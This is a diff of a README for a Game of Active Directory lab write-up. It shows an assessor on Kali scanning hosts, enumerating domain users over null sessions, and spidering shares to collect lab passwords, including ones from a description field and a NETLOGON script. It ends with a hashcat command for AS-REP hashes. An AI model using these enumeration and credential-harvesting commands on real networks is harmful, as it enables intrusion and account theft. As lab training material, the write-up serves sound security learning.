@@ -1,7 +1,9 @@
 # Goad-Write-Up
 
 This is a setup where GOAD is running on top of Ubuntu. An additional vm running kali was added to simulate a scenario where an internal assessment is conducted and the assessor already has access to the network.
-## Local Network Enumeration 
+
+
+## Subnet Enumeration
 
 ```bash
 ┌──(qdada㉿GOAD-kali)-[~/Desktop/ad]
@@ -36,7 +38,6 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 The kali box with IP 192.168.56.106 is on the 192.168.56.0/24 network.
 
-### 01. nmap
 
 ```bash
 ┌──(qdada㉿GOAD-kali)-[~/Desktop/ad]
@@ -132,8 +133,6 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Apr 28 02:17:38 2024 -- 1 IP address (1 host up) scanned in 60.03 seconds
 ```
-
-
 
 #### `WINTERFELL` - host (192.168.56.11)
 {north.sevenkingdoms.local}
@@ -468,11 +467,12 @@ Nmap done: 1 IP address (1 host up) scanned in 26.86 seconds
 
 
 ## User Enumeration
+### 01 - Null Session Enumeration
 
-### Null Session Enumeration
+#### Samwell Tarly
 
-For this task the following tools can be used to enumerate usersss
-#### rpcclient
+Samuel's Tarly's credentials were first to be discovered. For this task the following tools can be used to enumerate users
+##### rpcclient
 
 ```bash
 rpcclient -U "" //<IP_ADDRESS>
@@ -525,7 +525,7 @@ rpcclient $> enumdomgroups
 
 
 
-#### enum4linux
+##### enum4linux
 
 This command is most effective in that in one command reveals users, groups as well as important information in the description column of the ADUC ( [Active Directory Users and Computers](https://learn.microsoft.com/en-us/answers/questions/430532/active-directory-users-and-computers) ). On this host, a password is leaked for the user **samwell.tally**.
 
@@ -543,6 +543,7 @@ A more elaborate command that lists group membership in a single command but it 
 ```bash
 enum4linux -a -r -K 5000 192.168.56.11
 ```
+##### Netexec
 
 Netexec can be used to perform null session enumeration. If you have it installed, the command is
 
@@ -552,15 +553,12 @@ nxc smb 192.168.56.11 --users
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/05-netexec-anonymous-user-enumeration.png'><br><ins>Netexec user enumeration</ins></div>
 
-## Credentials
+### 02 - Authenticated Enumeration
 
-north.sevenkingdoms.local\samwell.tarly : Heartsbane
-```bash
-#obtained by 
-nxc smb 192.168.56.11 --users
-```
+#### Arya Stark
 
-north.sevenkingdoms.local\arya.stark : Needle
+Using credentials discovered from null session enumeration that revealed sensitive information disclosure where credentials were left in the open.
+
 ```bash
 #obtained by 
 nxc smb 192.168.56.0/24 -u 'samwell.tarly' -p 'Heartsbane' -M spider_plus
@@ -635,7 +633,7 @@ nxc smb 192.168.56.0/24 -u 'arya.stark' -p 'Needle'
 
 
 <div align="center" ><img width='100%' src='https://raw.githubusercontent.com/quincyntuli/Goad-Write-Up/main/img/08-arya-password-confirmation.png'><br><ins>Password Confirmed</ins></div>
-
+#### Jeor Mormont
 
 What can this Arya account access ? We run nxc once more ...
 
@@ -643,7 +641,7 @@ What can this Arya account access ? We run nxc once more ...
 nxc smb 192.168.56.11,22-23 -u 'arya.stark' -p 'Needle' -M spider_plus -o DOWNLOAD_FLAG=True
 ```
 
-From that we find the file `NETLOGON/script.ps1`
+That command downloads files including `NETLOGON/script.ps1`
 
 ```powershell
 ┌──(qdada㉿Embizweni)-[/tmp/nxc_spider_plus/192.168.56.11/NETLOGON]
@@ -659,4 +657,15 @@ Once again the credentials are tested over again ...
 
 ```bash
 nxc smb 192.168.56.0/24 -u 'NORTH\jeor.mormont' -p '_L0ngCl@w_' --users
+```
+
+
+It is discovered that Jeor Mormont has Administrator access on `CASTLEBLACK`, obviously.
+
+
+
+
+
+```ruby
+hashcat.exe -m 18200 hashes\out.txt wordlist\rockyou.txt
 ```
